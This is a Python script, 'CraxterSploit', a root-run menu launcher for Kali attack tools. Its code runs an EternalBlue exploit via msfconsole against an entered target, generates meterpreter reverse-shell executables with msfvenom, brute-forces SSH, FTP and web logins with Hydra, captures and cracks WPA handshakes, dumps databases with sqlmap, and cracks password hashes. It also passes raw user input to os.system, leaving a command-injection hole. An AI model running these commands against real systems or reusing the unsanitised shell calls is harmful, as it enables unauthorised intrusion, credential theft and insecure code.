#!/usr/bin/env python3
# Rip70022/NAXROC/Craxterpy property.
import os
import sys
import subprocess
import shutil
import argparse
import socket
import time
import re
import threading
import queue
import signal
import platform
from datetime import datetime
from colorama import Fore, Back, Style, init
from terminaltables import SingleTable

init(autoreset=True)

def clear_screen():
    os.system('clear')

def check_root():
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] This script must be run as root{Style.RESET_ALL}")
        sys.exit(1)

def check_kali():
    if "kali" not in platform.platform().lower():
        print(f"{Fore.YELLOW}[!] Warning: This script is designed for Kali Linux{Style.RESET_ALL}")
        time.sleep(1)

def check_tool_installed(tool_name):
    return shutil.which(tool_name) is not None

def install_tool(tool_name):
    try:
        subprocess.run(["apt-get", "update"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["apt-get", "install", "-y", tool_name], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        return False

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def display_banner():
    banner = rf"""
{Fore.CYAN}
   ____                  _            ____        _       _ _   
  / ___|_ __ __ ___  ___| |_ ___ _ __/ ___| _ __ | | ___ (_) |_ 
 | |   | '__/ _` \ \/ / _` __/ _ \ '__\___ \| '_ \| |/ _ \| | __|
 | |___| | | (_| |>  < (_| ||  __/ |   ___) | |_) | | (_) | | |_ 
  \____|_|  \__,_/_/\_\__,\__\___|_|  |____/| .__/|_|\___/|_|\__|
                                           |_|                  
{Style.RESET_ALL}
{Fore.RED}[*] Developed by: https://www.github.com/Rip70022{Style.RESET_ALL}
{Fore.YELLOW}[*] Version: 1.0{Style.RESET_ALL}
{Fore.GREEN}[*] Target: {get_local_ip()}{Style.RESET_ALL}
{Fore.BLUE}[*] Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}
"""
    print(banner)

def display_options():
    tools = [
        ["ID", "Tool", "Description", "Status"],
        ["1", "nmap", "Network scanning and discovery", check_tool_installed("nmap")],
        ["2", "metasploit", "Penetration testing framework", check_tool_installed("msfconsole")],
        ["3", "hydra", "Password cracking tool", check_tool_installed("hydra")],
        ["4", "aircrack-ng", "WiFi security assessment", check_tool_installed("aircrack-ng")],
        ["5", "burpsuite", "Web application security testing", check_tool_installed("burpsuite")],
        ["6", "wireshark", "Network protocol analyzer", check_tool_installed("wireshark")],
        ["7", "sqlmap", "SQL injection testing", check_tool_installed("sqlmap")],
        ["8", "john", "Password cracking", check_tool_installed("john")],
        ["9", "wifite", "Automated wireless attack tool", check_tool_installed("wifite")],
        ["10", "dirb", "Web content scanner", check_tool_installed("dirb")],
        ["11", "nikto", "Web server scanner", check_tool_installed("nikto")],
        ["12", "hashcat", "Advanced password recovery", check_tool_installed("hashcat")],
        ["13", "autopsy", "Digital forensics platform", check_tool_installed("autopsy")],
        ["14", "social-engineer-toolkit", "Social engineering attacks", check_tool_installed("setoolkit")],
        ["15", "maltego", "Open source intelligence", check_tool_installed("maltego")]
    ]

    for i in range(1, len(tools)):
        if tools[i][3]:
            tools[i][3] = f"{Fore.GREEN}Installed{Style.RESET_ALL}"
        else:
            tools[i][3] = f"{Fore.RED}Not Installed{Style.RESET_ALL}"

    table = SingleTable(tools)
    table.inner_row_border = True
    print(table.table)
    print(f"\n{Fore.CYAN}[*] Use 'install <id>' to install a tool{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Use 'exit' to quit{Style.RESET_ALL}")

def run_nmap_scan():
    print(f"\n{Fore.CYAN}[*] NMAP Scanning Options:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[1] Quick Scan{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[2] Comprehensive Scan{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[3] Vulnerability Scan{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[4] Custom Scan{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.GREEN}[*] Select an option: {Style.RESET_ALL}")
    target = input(f"{Fore.GREEN}[*] Enter target IP/domain: {Style.RESET_ALL}")
    
    if choice == "1":
        os.system(f"nmap -T4 -F {target}")
    elif choice == "2":
        os.system(f"nmap -T4 -A -v {target}")
    elif choice == "3":
        os.system(f"nmap -T4 --script vuln {target}")
    elif choice == "4":
        flags = input(f"{Fore.GREEN}[*] Enter nmap flags: {Style.RESET_ALL}")
        os.system(f"nmap {flags} {target}")
    else:
        print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")

def run_metasploit():
    print(f"\n{Fore.CYAN}[*] Metasploit Options:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[1] Start msfconsole{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[2] Quick exploit (ms17_010_eternalblue){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[3] Generate a payload{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.GREEN}[*] Select an option: {Style.RESET_ALL}")
    
    if choice == "1":
        os.system("msfconsole")
    elif choice == "2":
        target = input(f"{Fore.GREEN}[*] Enter target IP: {Style.RESET_ALL}")
        lhost = input(f"{Fore.GREEN}[*] Enter your IP (LHOST): {Style.RESET_ALL}")
        command = f"""msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set LHOST {lhost}; exploit" """
        os.system(command)
    elif choice == "3":
        payload = input(f"{Fore.GREEN}[*] Enter payload (e.g., windows/meterpreter/reverse_tcp): {Style.RESET_ALL}")
        lhost = input(f"{Fore.GREEN}[*] Enter LHOST: {Style.RESET_ALL}")
        lport = input(f"{Fore.GREEN}[*] Enter LPORT: {Style.RESET_ALL}")
        output = input(f"{Fore.GREEN}[*] Enter output file: {Style.RESET_ALL}")
        os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {output}")
    else:
        print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")

def run_hydra():
    print(f"\n{Fore.CYAN}[*] Hydra Options:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[1] SSH Brute Force{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[2] FTP Brute Force{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[3] Web Form Brute Force{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[4] Custom Attack{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.GREEN}[*] Select an option: {Style.RESET_ALL}")
    
    if choice == "1":
        target = input(f"{Fore.GREEN}[*] Enter target IP: {Style.RESET_ALL}")
        user = input(f"{Fore.GREEN}[*] Enter username (or path to user list): {Style.RESET_ALL}")
        wordlist = input(f"{Fore.GREEN}[*] Enter path to password list: {Style.RESET_ALL}")
        os.system(f"hydra -l {user} -P {wordlist} {target} ssh")
    elif choice == "2":
        target = input(f"{Fore.GREEN}[*] Enter target IP: {Style.RESET_ALL}")
        user = input(f"{Fore.GREEN}[*] Enter username (or path to user list): {Style.RESET_ALL}")
        wordlist = input(f"{Fore.GREEN}[*] Enter path to password list: {Style.RESET_ALL}")
        os.system(f"hydra -l {user} -P {wordlist} {target} ftp")
    elif choice == "3":
        target = input(f"{Fore.GREEN}[*] Enter target URL: {Style.RESET_ALL}")
        form = input(f"{Fore.GREEN}[*] Enter form parameters (e.g., /login.php:username=^USER^&password=^PASS^:F=Login failed): {Style.RESET_ALL}")
        user = input(f"{Fore.GREEN}[*] Enter username (or path to user list): {Style.RESET_ALL}")
        wordlist = input(f"{Fore.GREEN}[*] Enter path to password list: {Style.RESET_ALL}")
        os.system(f"hydra -l {user} -P {wordlist} {target} http-post-form \"{form}\"")
    elif choice == "4":
        command = input(f"{Fore.GREEN}[*] Enter custom hydra command: {Style.RESET_ALL}")
        os.system(f"hydra {command}")
    else:
        print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")

def run_aircrack():
    print(f"\n{Fore.CYAN}[*] Aircrack-ng Options:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[1] Put interface in monitor mode{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[2] Capture handshake{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[3] Crack WPA handshake{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.GREEN}[*] Select an option: {Style.RESET_ALL}")
    
    if choice == "1":
        interface = input(f"{Fore.GREEN}[*] Enter interface name: {Style.RESET_ALL}")
        os.system(f"airmon-ng check kill")
        os.system(f"airmon-ng start {interface}")
    elif choice == "2":
        interface = input(f"{Fore.GREEN}[*] Enter interface name (with mon, e.g., wlan0mon): {Style.RESET_ALL}")
        os.system(f"airodump-ng {interface}")
        bssid = input(f"{Fore.GREEN}[*] Enter target BSSID: {Style.RESET_ALL}")
        channel = input(f"{Fore.GREEN}[*] Enter channel: {Style.RESET_ALL}")
        output = input(f"{Fore.GREEN}[*] Enter output file name: {Style.RESET_ALL}")
        os.system(f"airodump-ng -c {channel} --bssid {bssid} -w {output} {interface}")
    elif choice == "3":
        capture = input(f"{Fore.GREEN}[*] Enter path to capture file (.cap): {Style.RESET_ALL}")
        wordlist = input(f"{Fore.GREEN}[*] Enter path to wordlist: {Style.RESET_ALL}")
        os.system(f"aircrack-ng {capture} -w {wordlist}")
    else:
        print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")

def run_sqlmap():
    print(f"\n{Fore.CYAN}[*] SQLMap Options:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[1] Basic URL Scan{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[2] POST Request Scan{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[3] Advanced Scan (with Database Enumeration){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[4] Custom Scan{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.GREEN}[*] Select an option: {Style.RESET_ALL}")
    
    if choice == "1":
        url = input(f"{Fore.GREEN}[*] Enter target URL: {Style.RESET_ALL}")
        os.system(f"sqlmap -u \"{url}\" --batch")
    elif choice == "2":
        url = input(f"{Fore.GREEN}[*] Enter target URL: {Style.RESET_ALL}")
        data = input(f"{Fore.GREEN}[*] Enter POST data (e.g., username=admin&password=test): {Style.RESET_ALL}")
        os.system(f"sqlmap -u \"{url}\" --data=\"{data}\" --batch")
    elif choice == "3":
        url = input(f"{Fore.GREEN}[*] Enter target URL: {Style.RESET_ALL}")
        os.system(f"sqlmap -u \"{url}\" --batch --dbs --tables --dump")
    elif choice == "4":
        command = input(f"{Fore.GREEN}[*] Enter custom sqlmap command: {Style.RESET_ALL}")
        os.system(f"sqlmap {command}")
    else:
        print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")

def run_john():
    print(f"\n{Fore.CYAN}[*] John the Ripper Options:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[1] Crack Linux Password File{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[2] Crack Windows NTLM Hashes{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[3] Crack ZIP/RAR Password{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[4] Custom Crack{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.GREEN}[*] Select an option: {Style.RESET_ALL}")
    
    if choice == "1":
        shadow = input(f"{Fore.GREEN}[*] Enter path to shadow file: {Style.RESET_ALL}")
        wordlist = input(f"{Fore.GREEN}[*] Enter path to wordlist (leave empty for default): {Style.RESET_ALL}")
        if wordlist:
            os.system(f"john --wordlist={wordlist} {shadow}")
        else:
            os.system(f"john {shadow}")
    elif choice == "2":
        ntlm = input(f"{Fore.GREEN}[*] Enter path to NTLM hash file: {Style.RESET_ALL}")
        wordlist = input(f"{Fore.GREEN}[*] Enter path to wordlist (leave empty for default): {Style.RESET_ALL}")
        if wordlist:
            os.system(f"john --format=NT --wordlist={wordlist} {ntlm}")
        else:
            os.system(f"john --format=NT {ntlm}")
    elif choice == "3":
        file_type = input(f"{Fore.GREEN}[*] Enter file type (zip/rar): {Style.RESET_ALL}")
        file_path = input(f"{Fore.GREEN}[*] Enter path to {file_type} file: {Style.RESET_ALL}")
        hash_file = f"{file_path}.hash"
        if file_type.lower() == "zip":
            os.system(f"zip2john {file_path} > {hash_file}")
        else:
            os.system(f"rar2john {file_path} > {hash_file}")
        wordlist = input(f"{Fore.GREEN}[*] Enter path to wordlist (leave empty for default): {Style.RESET_ALL}")
        if wordlist:
            os.system(f"john --wordlist={wordlist} {hash_file}")
        else:
            os.system(f"john {hash_file}")
    elif choice == "4":
        command = input(f"{Fore.GREEN}[*] Enter custom john command: {Style.RESET_ALL}")
        os.system(f"john {command}")
    else:
        print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")

def run_nikto():
    print(f"\n{Fore.CYAN}[*] Nikto Options:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[1] Basic Scan{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[2] Comprehensive Scan{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[3] SSL Scan{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[4] Custom Scan{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.GREEN}[*] Select an option: {Style.RESET_ALL}")
    
    if choice == "1":
        target = input(f"{Fore.GREEN}[*] Enter target URL: {Style.RESET_ALL}")
        os.system(f"nikto -h {target}")
    elif choice == "2":
        target = input(f"{Fore.GREEN}[*] Enter target URL: {Style.RESET_ALL}")
        output = input(f"{Fore.GREEN}[*] Enter output file name: {Style.RESET_ALL}")
        os.system(f"nikto -h {target} -o {output} -Format html -Tuning x")
    elif choice == "3":
        target = input(f"{Fore.GREEN}[*] Enter target URL (https://...): {Style.RESET_ALL}")
        os.system(f"nikto -h {target} -ssl")
    elif choice == "4":
        command = input(f"{Fore.GREEN}[*] Enter custom nikto command: {Style.RESET_ALL}")
        os.system(f"nikto {command}")
    else:
        print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")

def run_tool(tool_id):
    if tool_id == "1":
        if check_tool_installed("nmap"):
            run_nmap_scan()
        else:
            print(f"{Fore.RED}[!] nmap is not installed{Style.RESET_ALL}")
    elif tool_id == "2":
        if check_tool_installed("msfconsole"):
            run_metasploit()
        else:
            print(f"{Fore.RED}[!] metasploit is not installed{Style.RESET_ALL}")
    elif tool_id == "3":
        if check_tool_installed("hydra"):
            run_hydra()
        else:
            print(f"{Fore.RED}[!] hydra is not installed{Style.RESET_ALL}")
    elif tool_id == "4":
        if check_tool_installed("aircrack-ng"):
            run_aircrack()
        else:
            print(f"{Fore.RED}[!] aircrack-ng is not installed{Style.RESET_ALL}")
    elif tool_id == "5":
        if check_tool_installed("burpsuite"):
            os.system("burpsuite")
        else:
            print(f"{Fore.RED}[!] burpsuite is not installed{Style.RESET_ALL}")
    elif tool_id == "6":
        if check_tool_installed("wireshark"):
            os.system("wireshark")
        else:
            print(f"{Fore.RED}[!] wireshark is not installed{Style.RESET_ALL}")
    elif tool_id == "7":
        if check_tool_installed("sqlmap"):
            run_sqlmap()
        else:
            print(f"{Fore.RED}[!] sqlmap is not installed{Style.RESET_ALL}")
    elif tool_id == "8":
        if check_tool_installed("john"):
            run_john()
        else:
            print(f"{Fore.RED}[!] john is not installed{Style.RESET_ALL}")
    elif tool_id == "9":
        if check_tool_installed("wifite"):
            os.system("wifite")
        else:
            print(f"{Fore.RED}[!] wifite is not installed{Style.RESET_ALL}")
    elif tool_id == "10":
        if check_tool_installed("dirb"):
            target = input(f"{Fore.GREEN}[*] Enter target URL: {Style.RESET_ALL}")
            wordlist = input(f"{Fore.GREEN}[*] Enter wordlist path (leave empty for default): {Style.RESET_ALL}")
            if wordlist:
                os.system(f"dirb {target} {wordlist}")
            else:
                os.system(f"dirb {target}")
        else:
            print(f"{Fore.RED}[!] dirb is not installed{Style.RESET_ALL}")
    elif tool_id == "11":
        if check_tool_installed("nikto"):
            run_nikto()
        else:
            print(f"{Fore.RED}[!] nikto is not installed{Style.RESET_ALL}")
    elif tool_id == "12":
        if check_tool_installed("hashcat"):
            hash_file = input(f"{Fore.GREEN}[*] Enter path to hash file: {Style.RESET_ALL}")
            wordlist = input(f"{Fore.GREEN}[*] Enter path to wordlist: {Style.RESET_ALL}")
            hash_type = input(f"{Fore.GREEN}[*] Enter hash type (e.g., 0 for MD5): {Style.RESET_ALL}")
            os.system(f"hashcat -m {hash_type} -a 0 {hash_file} {wordlist}")
        else:
            print(f"{Fore.RED}[!] hashcat is not installed{Style.RESET_ALL}")
    elif tool_id == "13":
        if check_tool_installed("autopsy"):
            os.system("autopsy")
        else:
            print(f"{Fore.RED}[!] autopsy is not installed{Style.RESET_ALL}")
    elif tool_id == "14":
        if check_tool_installed("setoolkit"):
            os.system("setoolkit")
        else:
            print(f"{Fore.RED}[!] social-engineer-toolkit is not installed{Style.RESET_ALL}")
    elif tool_id == "15":
        if check_tool_installed("maltego"):
            os.system("maltego")
        else:
            print(f"{Fore.RED}[!] maltego is not installed{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[!] Invalid tool ID{Style.RESET_ALL}")

def main():
    check_root()
    check_kali()
    
    parser = argparse.ArgumentParser(description="CraxterSploit - Advanced Kali Linux Interface")
    parser.add_argument("--tool", help="Directly run a tool by ID")
    args = parser.parse_args()
    
    if args.tool:
        run_tool(args.tool)
        return
    
    while True:
        clear_screen()
        display_banner()
        display_options()
        
        command = input(f"\n{Fore.RED}>>craxtersploit<<:~# {Style.RESET_ALL}")
        
        if command.lower() == "exit":
            print(f"{Fore.YELLOW}[*] Exiting CraxterSploit...{Style.RESET_ALL}")
            break
        elif command.lower().startswith("install "):
            tool_id = command.split()[1]
            tool_name = None
            
            for i in range(1, 16):
                if tool_id == str(i):
                    tool_name = [
                        "nmap", "metasploit-framework", "hydra", "aircrack-ng", "burpsuite",
                        "wireshark", "sqlmap", "john", "wifite", "dirb", "nikto", "hashcat",
                        "autopsy", "set", "maltego"
                    ][i-1]
                    break
            
            if tool_name:
                print(f"{Fore.YELLOW}[*] Installing {tool_name}...{Style.RESET_ALL}")
                if install_tool(tool_name):
                    print(f"{Fore.GREEN}[+] {tool_name} installed successfully{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] Failed to install {tool_name}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid tool ID{Style.RESET_ALL}")
        elif command.isdigit():
            run_tool(command)
            input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Invalid command{Style.RESET_ALL}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Exiting CraxterSploit...{Style.RESET_ALL}")
        sys.exit(0)